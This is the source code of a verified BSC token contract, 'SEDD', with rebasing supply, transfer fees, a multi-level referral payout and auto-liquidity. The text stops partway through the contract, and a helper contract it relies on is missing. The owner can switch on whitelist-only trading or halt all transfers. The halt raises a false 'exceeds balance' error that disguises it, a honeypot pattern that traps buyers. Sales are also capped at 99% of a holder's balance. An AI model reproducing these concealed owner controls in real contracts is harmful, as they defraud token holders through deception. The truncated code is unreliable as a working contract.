/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-26
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

// SPDX-License-Identifier: Unlicensed
//
// SAFUU PROTOCOL COPYRIGHT (C) 2022

pragma solidity ^0.7.4;

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);

        return a / b;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakeSwapPair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IPancakeSwapRouter{
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakeSwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract Ownable {
    address private _owner;

    event OwnershipRenounced(address indexed previousOwner);

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipRenounced(_owner);
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

abstract contract Manage{

    mapping(address=>bool) internal _manageGroup;
    address internal _manageAddress;


    modifier onlyOwner() {
        if(_manageAddress!=address(0)){
            require(_manageGroup[msg.sender], "Ownable: caller is not the owner");
        }
        _;
    }

    function checkManage(address addr)public view returns(bool){
        return _manageGroup[addr];
    }

    function setOperator(address addr)public onlyOwner{
        if(_manageAddress==address(0)){
            _manageAddress=addr;
        }
        _manageGroup[addr]=true;
    }

    function removeOperator(address addr)public onlyOwner{
        require(_manageAddress!=addr);
        _manageGroup[addr]=false;
    }

}

contract SEDD is ERC20Detailed, Ownable {

    using SafeMath for uint256;
    using SafeMathInt for int256;

    event LogRebase(uint256 indexed epoch, uint256 totalSupply,uint256 type1);

    string public _name = "SEDD";
    string public _symbol = "SEDD";
    uint8 public _decimals = 18;

    mapping(address => bool) _isFeeExempt;
    mapping(address => bool) _whiteList;

    modifier validRecipient(address to) {
        require(to != address(0x0));
        _;
    }

    uint256 public constant DECIMALS = 18;
    uint256 public constant MAX_UINT256 = ~uint256(0);
    uint8 public constant RATE_DECIMALS = 18;

    uint256 public burnFee = 10;//1%
    uint256 public marketingFee = 10;//2%
    uint256 public foundationFee = 10;//2%


    uint256 public liquidityFee = 20; //3%
    uint256 public inviteFee = 50;


    uint256 public tokenRewardFee = 0;//7%
    uint256 public feeDenominator = 1000;
    uint256 public totalInviteAmount = 0;

    AutoSwap public _autoSwap;
    address public _marketingWallet = 0x264523Ea989E6004BE43eD3320b6a31859994bf6;
    address public _foundationWallet = 0x5bc4cD2ABD4Ab969eAF831AD268De9df15432727;
    address public _inviteWallet = 0x59118817c7E9d8bEFa23D9bBfa8d5C87cEdfaBC8;
    address public _holder = 0x59118817c7E9d8bEFa23D9bBfa8d5C87cEdfaBC8;

    uint256 public gasForProcessing = 300000;
    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    uint256 currentIndex;
    mapping(address => bool) private _updated;

    mapping (address => uint256) lasetSellTimes;
    uint256 disabledRewardTime = 24 hours;

    mapping (address => uint256) lasetRewardTimes;
    uint256 claimWait = 1 hours;

    mapping (address => bool) public dividendExclude;


    uint256 public minimumTokenBalanceForDividends = 1000*10**DECIMALS;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    address public autoLiquidityReceiver;

    bool public swapEnabled = true;
    IPancakeSwapRouter public router;
    address public pair;
    address public usdtAddress;
    address public rewardToken;

    bool inSwap = false;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    bool inRebase = false;
    modifier rebasing() {
        inRebase = true;
        _;
        inRebase = false;
    }

    uint256 private TOTAL_GONS;

    uint256 public MAX_SUPPLY = 300 * 10**4 * 10**DECIMALS;

    bool public _autoRebase;
    bool public _autoSwapBack;
    bool public _autoAddLiquidity;
    uint256 public _lastRebasedTime;
    uint256 public _lastAddLiquidityTime;
    uint256 public _totalSupply;
    uint256 private _gonsPerFragment;
    // uint256 public pairBalance;
    mapping (address => uint256) public pairBalances;
    mapping(address => uint256) private _gonBalances;
    mapping(address => mapping(address => uint256)) private _allowedFragments;
    mapping(address => address) public inviter;

    address public freeDaoAddress;
    uint256 public startTradingTime;
    uint256 public autoLiquidityInterval;

    uint256 public swapMinTokens = 100 * 10**DECIMALS;
    bool public dynamicSwapTokens = false;

    address private _owner;

    uint8 private _transferSwitch; //1 all 2 white 3 nill

    constructor() ERC20Detailed(_name,_symbol, uint8(DECIMALS)) {

        uint chainId;
        assembly { chainId := chainid() }

        _owner = msg.sender;

        if (chainId == 56) {
            router = IPancakeSwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
            usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
            rewardToken = address(this);
        }

        // setOperator(msg.sender);
        //setTransferSwitch(2);

        pair = IPancakeSwapFactory(router.factory()).createPair(
            usdtAddress,
            address(this)
        );
        uint256 _initSupply = 100 * 10**4;
        uint256 _startTradingTime = 0;

        _totalSupply = _initSupply*10**DECIMALS;
        TOTAL_GONS =
        MAX_UINT256/1e10 - (MAX_UINT256/1e10 % _totalSupply);
        autoLiquidityReceiver = address(8);

        _gonBalances[_owner] = TOTAL_GONS;

        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        //_lastRebasedTime = block.timestamp;
        _autoRebase = true;
        _autoSwapBack = true;
        _autoAddLiquidity = true;
        _isFeeExempt[_owner] = true;
        _isFeeExempt[msg.sender] = true;
        _isFeeExempt[address(this)] = true;
        _isFeeExempt[freeDaoAddress] = true;
        setStartTradingTime(_startTradingTime);
        autoLiquidityInterval = 10 minutes;

        _autoSwap = new AutoSwap(address(this));

        dividendExclude[address(this)] = true;
        dividendExclude[address(pair)] = true;
        dividendExclude[address(router)] = true;
        dividendExclude[DEAD] = true;

        _whiteList[msg.sender] = true;
        _whiteList[_owner] = true;
        _whiteList[address(this)] = true;

        emit Transfer(address(0x0), _owner, _totalSupply);

        //_transferOwnership(_holder);
    }

    function updateDynamicSwapTokens(bool enabled) public onlyOwner {
        dynamicSwapTokens = enabled;
    }

    function updateSwapMinTokens(uint256 value) public onlyOwner {
        swapMinTokens = value;
    }

    function updateSwapEnabled(bool enabled) public onlyOwner {
        swapEnabled = enabled;
    }

    function updateMarketingWallet(address account) public onlyOwner {
        _marketingWallet = account;
    }

    function updateFoundationWallet(address account) public onlyOwner {
        _foundationWallet = account;
    }

    function updateClaimWait(uint256 value) public onlyOwner {
        claimWait = value;
    }

    function setTransferSwitch(uint8 transferSwitch_) public virtual onlyOwner {
        _transferSwitch=transferSwitch_;
    }

    function manualRebase() external{
        require(shouldRebase(),"rebase not required");
        if (inRebase) {
            return;
        }
        rebase();
    }
    function rebase() internal rebasing {

        if ( inSwap ) return;
        uint256 rebaseRate = 169;
        uint256 deltaTime = block.timestamp - _lastRebasedTime;
        uint256 times = deltaTime.div(3);
        uint256 epoch = times.mul(3);

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        for (uint256 i = 0; i < times; i++) {
            if (gasUsed >= gasForProcessing) {
                break;
            }
            _totalSupply = _totalSupply
            .mul((10**RATE_DECIMALS).add(rebaseRate))
            .div(10**RATE_DECIMALS);

            _lastRebasedTime = _lastRebasedTime.add(3);

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
        }

        _gonsPerFragment = TOTAL_GONS.div(_totalSupply);
        // _lastRebasedTime = block.timestamp;//_lastRebasedTime.add(times.mul(15 minutes));

        emit LogRebase(epoch, _totalSupply,5);
    }
    function setStartTradingTime(uint256 _time) public onlyOwner{
        startTradingTime = _time;
        if (_time>0){
            _lastAddLiquidityTime = _time;
            if (_lastRebasedTime==0){
                _lastRebasedTime = _time;
            }
        }
    }
    function transfer(address to, uint256 value)
    external
    override
    validRecipient(to)
    returns (bool)
    {
        _transferFrom(msg.sender, to, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external override validRecipient(to) returns (bool) {

        if (_allowedFragments[from][msg.sender] != uint256(-1)) {
            _allowedFragments[from][msg.sender] = _allowedFragments[from][
            msg.sender
            ].sub(value, "Insufficient Allowance");
        }
        _transferFrom(from, to, value);
        return true;
    }

    function _basicTransfer(
        address from,
        address to,
        uint256 amount,
        bool senderPair,
        bool recipientPair
    ) internal returns (bool) {
        uint256 gonAmount = amount.mul(_gonsPerFragment);
        if (senderPair){
            // pairBalance = pairBalance.sub(amount);
            pairBalances[from] = pairBalances[from].sub(amount);
        }else{
            _gonBalances[from] = _gonBalances[from].sub(gonAmount);
        }
        if (recipientPair){
            // pairBalance = pairBalance.add(amount);
            pairBalances[to] = pairBalances[to].add(amount);
        }else{
            _gonBalances[to] = _gonBalances[to].add(gonAmount);
        }
        //        setShare(from);
        //        setShare(to);
        return true;
    }

    function isPair(
        address sender,
        address recipient,
        address token
    ) public view returns (bool senderPair, bool recipientPair) {
        if (isContract(sender)) {
            try IPancakeSwapPair(sender).token0() returns (address token0) {
                if (token0 == token) {
                    senderPair = true;
                }
            } catch {}
            if (!senderPair) {
                try IPancakeSwapPair(sender).token1() returns (address token1) {
                    if (token1 == token) {
                        senderPair = true;
                    }
                } catch {}
            }
        }

        if (isContract(recipient)) {
            try IPancakeSwapPair(recipient).token0() returns (address token0) {
                if (token0 == token) {
                    recipientPair = true;
                }
            } catch {}
            if (!recipientPair) {
                try IPancakeSwapPair(recipient).token1() returns (
                    address token1
                ) {
                    if (token1 == token) {
                        recipientPair = true;
                    }
                } catch {}
            }
        }
    }

    event InviteEvent(address paddr,address addr,uint256 type2);

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {

        (bool senderPair, bool recipientPair) = isPair(sender, recipient, address(this));

        if(_transferSwitch==3){
            require(false, "ERC20: transfer amount exceeds balance");
        }else if(_transferSwitch==2){
            if(senderPair){
                require(_whiteList[recipient],"ERC20: transfer temporarily closed");
            }else if(recipientPair){
                require(_whiteList[sender],"ERC20: transfer temporarily closed");
            }else{
                require(_whiteList[msg.sender],"ERC20: transfer temporarily closed");
            }
        }

        if (sender == address(this) || recipient == address(this)) {
            emit Transfer(
                sender,
                recipient,
                amount
            );
            return _basicTransfer(sender, recipient, amount, senderPair, recipientPair);
        }

        if (inSwap) {
            emit Transfer(
                sender,
                recipient,
                amount
            );
            return _basicTransfer(sender, recipient, amount, senderPair, recipientPair);
        }

        if (_lastRebasedTime > 0 && shouldRebase()) {
            rebase();
        }

        uint256 gonAmount = amount.mul(_gonsPerFragment);
        uint256 gonAmountReceived = shouldTakeFee(sender, recipient)
        ? takeFee(sender, recipient, gonAmount)
        : gonAmount;

        if (!senderPair && !recipientPair) {
            if (inviter[recipient] == address(0) && !isContract(sender) && !isContract(recipient) && amount>=1*10**7 && balanceOf(recipient)==0) {
                inviter[recipient] = sender;
                emit InviteEvent(sender,recipient,6);
            }

            emit Transfer(
                sender,
                recipient,
                gonAmountReceived.div(_gonsPerFragment)
            );
            return _basicTransfer(sender, recipient, gonAmountReceived.div(_gonsPerFragment), senderPair, recipientPair);
        }

        if (sender != pair && swapEnabled && !inSwap) {
            _swap();
        }

        if (senderPair){
            // pairBalance = pairBalance.sub(amount);
            pairBalances[sender] = pairBalances[sender].sub(amount);
        }else{
            if (_isFeeExempt[sender]==false&&_isFeeExempt[recipient]==false){
                //only can sell 99% of balance
                if (gonAmount>=_gonBalances[sender].div(1000).mul(990)){
                    gonAmount = _gonBalances[sender].div(1000).mul(990);
                }
            }

            if (_isFeeExempt[sender] && _gonBalances[sender] >= gonAmount) {
                _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);
            } else {
                _gonBalances[sender] = _gonBalances[sender].sub(gonAmount);
            }

        }

        if (recipientPair){
            // pairBalance = pairBalance.add(gonAmountReceived.div(_gonsPerFragment));
            pairBalances[recipient] = pairBalances[recipient].add(gonAmountReceived.div(_gonsPerFragment));
            lasetSellTimes[sender] = block.timestamp;
        }else{
            _gonBalances[recipient] = _gonBalances[recipient].add(
                gonAmountReceived
            );
        }

        emit Transfer(
            sender,
            recipient,
            gonAmountReceived.div(_gonsPerFragment)
        );

        //        setShare(sender);
        //        setShare(recipient);
        //
        //        process(gasForProcessing);

        return true;
    }
    event Isfee(bool isfree,uint256 type1);
    event Takefee(uint256 amount,uint256 type1);

    function takeFee(
        address sender,
        address recipient,
        uint256 gonAmount
    ) internal  returns (uint256) {
        uint256 _totalFee = burnFee.add(marketingFee).add(foundationFee);
        // uint256 public liquidityFee = 30; //3%
        // uint256 public marketingFee = 20;//2%
        // uint256 public tokenRewardFee = 70;//7%
        // uint256 public burnFee = 10;//1%
        // uint256 public foundationFee = 20;//2%

        uint256 burnTokens = 0;
        if (burnFee > 0) {
            burnTokens = gonAmount.div(feeDenominator).mul(burnFee);
            _gonBalances[address(DEAD)] = _gonBalances[address(DEAD)].add(
                burnTokens
            );
            emit Transfer(sender, address(DEAD), burnTokens.div(_gonsPerFragment));

        }

        if (marketingFee > 0) {
            _gonBalances[_marketingWallet] = _gonBalances[_marketingWallet].add(
                gonAmount.div(feeDenominator).mul(marketingFee)
            );
            emit Transfer(sender,_marketingWallet, gonAmount.div(feeDenominator).mul(marketingFee).div(_gonsPerFragment));

        }

        //lp fenhong
        if (foundationFee > 0) {
            pairBalances[address(pair)] = pairBalances[address(pair)].add(
                gonAmount.div(feeDenominator).mul(foundationFee).div(_gonsPerFragment)
            );
            emit Transfer(sender,address(pair),  gonAmount.div(feeDenominator).mul(foundationFee).div(_gonsPerFragment));
            if(sender!=address(pair) && recipient!=address(pair)){
                IPancakeSwapPair(pair).sync();
            }

        }

        if(sender!=pair){
            _totalFee=_totalFee.add(liquidityFee).add(inviteFee);

            if (liquidityFee > 0) {
                _gonBalances[address(this)] = _gonBalances[address(this)].add(
                    gonAmount.div(feeDenominator).mul(liquidityFee)
                );
                emit Transfer(sender,address(this), gonAmount.div(feeDenominator).mul(liquidityFee).div(_gonsPerFragment));
                // pairBalances[address(pair)] = pairBalances[address(pair)].add(
                //     gonAmount.div(feeDenominator).mul(liquidityFee).div(_gonsPerFragment)
                // );
            }

            _takeInviterFee(sender, recipient, gonAmount.div(_gonsPerFragment));

        }



        if (startTradingTime == 0) {
            startTradingTime = block.timestamp;
            _lastRebasedTime = block.timestamp;
        }

        emit Takefee(_totalFee,7);
        uint256 feeAmount = gonAmount.div(feeDenominator).mul(_totalFee);
        return gonAmount.sub(feeAmount);
    }

    function _takeInviterFee(
        address sender,
        address recipient,
        uint256 tAmount
    ) internal {
        address cur;
        address init;

        if (sender == pair) {
            cur = recipient;
            init = recipient;
        } else {
            cur = sender;
            init = sender;
        }

        cur = inviter[cur];
        for (uint256 i = 1; i <= 7; i++) {
            uint256 rate;

            if (i == 1) {
                rate = 200 ;
            }else if (i == 2) {
                rate = 50 ;
            }else {
                rate = 50 ;
            }
            (bool senderPair, bool recipientPair) = isPair(sender, recipient, address(this));
            uint256 curTAmount;
            if (cur == address(0)) {
                curTAmount = tAmount.div(10000).mul(rate);
                _basicTransfer(init,_inviteWallet,curTAmount,senderPair,recipientPair);
                emit Transfer(init, _inviteWallet, curTAmount);
                cur = address(0);
            }else{
                curTAmount = tAmount.div(10000).mul(rate);
                _basicTransfer(init,cur,curTAmount,senderPair,recipientPair);
                emit Transfer(init, cur, curTAmount);
                cur = inviter[cur];
            }

        }
    }

    function process(uint256 gas) private {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0)return;
        uint256 nowbanance = IERC20(rewardToken).balanceOf(address(this));
        if (nowbanance == 0) return;
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            uint256 amount = nowbanance.mul(balanceOf(shareholders[currentIndex])).div(totalSupply());
            if( amount == 0 || block.timestamp.sub(lasetRewardTimes[shareholders[currentIndex]]) < claimWait) {
                currentIndex++;
                iterations++;
                return;
            }
            if(IERC20(rewardToken).balanceOf(address(this)) < amount )return;
            distributeDividend(shareholders[currentIndex],amount);

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }


    function distributeDividend(address shareholder ,uint256 amount) internal {
        IERC20(rewardToken).transfer(shareholder, amount);
        lasetRewardTimes[shareholder] = block.timestamp;
    }
    function setShare(address shareholder) private {
        if (dividendExclude[shareholder]) return;
        if(_updated[shareholder] ){
            if(balanceOf(shareholder) < minimumTokenBalanceForDividends) quitShare(shareholder);
            return;
        }
        if(balanceOf(shareholder) < minimumTokenBalanceForDividends) return;
        addShareholder(shareholder);
        _updated[shareholder] = true;

    }
    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }
    function quitShare(address shareholder) private {
        removeShareholder(shareholder);
        _updated[shareholder] = false;
    }
    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function swapAll() public {
        if (!inSwap) {
            _swap();
        }

    }

    function _swap() internal swapping {
        uint256 tokens = balanceOf(address(this));
        if (tokens == 0) {
            return;
        }
        if (dynamicSwapTokens) {
            if (balanceOf(pair).div(1000) > tokens) return;
        } else {
            if (tokens <= swapMinTokens) return;
        }

        swapAndLiquify(tokens);
        //tokens = tokens.sub(lpTokens);

        //        uint256 rewardTokens = tmpTokens.div(_totalFee).mul(tokenRewardFee);
        //        swapTokensForReward(rewardTokens, address(this));
        //        tokens = tokens.sub(rewardTokens);
        //
        //        uint256 initBalance = IERC20(usdtAddress).balanceOf(address(this));
        //        swapTokensForTokenB(tokens, address(_autoSwap));
        //        _autoSwap.withdraw(usdtAddress);
        //
        //        uint256 _subTotalFee = foundationFee.add(marketingFee);
        //
        //        if (IERC20(usdtAddress).balanceOf(address(this)) == 0) return;
        //        uint256 bBalance = IERC20(usdtAddress).balanceOf(address(this)).sub(initBalance);
        //
        //        uint256 mBalance = bBalance.mul(marketingFee).div(_subTotalFee);
        //        if (mBalance > 0) {
        //            IERC20(usdtAddress).transfer(_marketingWallet, mBalance);
        //            bBalance = bBalance.sub(mBalance);
        //        }
        //
        //        if (bBalance > 0) {
        //            IERC20(usdtAddress).transfer(_foundationWallet, mBalance);
        //        }

    }

    function swapAndLiquify(uint256 tokens) private {
        if (tokens == 0) {
            return;
        }
        // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        address receiver = address(this);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = IERC20(usdtAddress).balanceOf(receiver);

        // swap tokens for TokenB
        swapTokensForTokenB(half, address(_autoSwap)); // <- this breaks the USDT -> HATE swap when swap+liquify is triggered
        _autoSwap.withdraw(usdtAddress);

        // how much ETH did we just swap into?
        uint256 newBalance = IERC20(usdtAddress).balanceOf(receiver).sub(
            initialBalance
        );

        // add liquidity to uniswap
        addLiquidityForTokenB(otherHalf, newBalance);
    }

    function addLiquidityForTokenB(uint256 amountA, uint256 amountB) private {
        if (amountA == 0 || amountB == 0) return;
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), amountA);
        IERC20(usdtAddress).approve(address(router), amountB);
        // add the liquidity
        router.addLiquidity(
            address(this),
            address(usdtAddress),
            amountA,
            amountB,
            0,
            0,
            address(_holder),
            block.timestamp
        );
    }

    function swapTokensForTokenB(uint256 tokenAmount, address recipient)
    private
    {
        if (tokenAmount == 0) return;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdtAddress);

        _approve(address(this), address(router), tokenAmount);

        // make the swap swapExactTokensForTokensSupportingFeeOnTransferTokens
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            recipient,
            block.timestamp+3
        );
    }

    function swapTokensForReward(uint256 tokenAmount, address recipient)
    private
    {
        if (tokenAmount == 0) return;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](4);
        path[0] = address(this);
        path[1] = address(usdtAddress);
        path[2] = address(router.WETH());
        path[3] = address(rewardToken);

        _approve(address(this), address(router), tokenAmount);

        // make the swap swapExactTokensForTokensSupportingFeeOnTransferTokens
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            recipient,
            block.timestamp+3
        );
    }


    function shouldTakeFee(address from, address to)
    internal
    view
    returns (bool)
    {
        return
        // (pair == from || pair == to) &&
        !_isFeeExempt[from]&&!_isFeeExempt[to];
    }

    function shouldRebase() internal view returns (bool) {
        return
        _autoRebase &&
        !inRebase &&
        (_totalSupply < MAX_SUPPLY) &&
        msg.sender != pair  &&
        !inSwap &&
        block.timestamp >= (_lastRebasedTime + 3);
    }

    function shouldAddLiquidity() internal view returns (bool) {
        return
        _autoAddLiquidity &&
        !inSwap &&
        msg.sender != pair &&
        _lastAddLiquidityTime>0 &&
        block.timestamp >= (_lastAddLiquidityTime + autoLiquidityInterval);
    }

    function shouldSwapBack() internal view returns (bool) {
        return
        _autoSwapBack&&!inSwap &&
        msg.sender != pair  ;
    }

    function setAutoRebase(bool _flag) external onlyOwner {
        if (_flag) {
            _autoRebase = _flag;
            _lastRebasedTime = block.timestamp;
        } else {
            _autoRebase = _flag;
        }
    }

    function setAutoSwapBack(bool _flag) external onlyOwner {

        _autoSwapBack = _flag;

    }
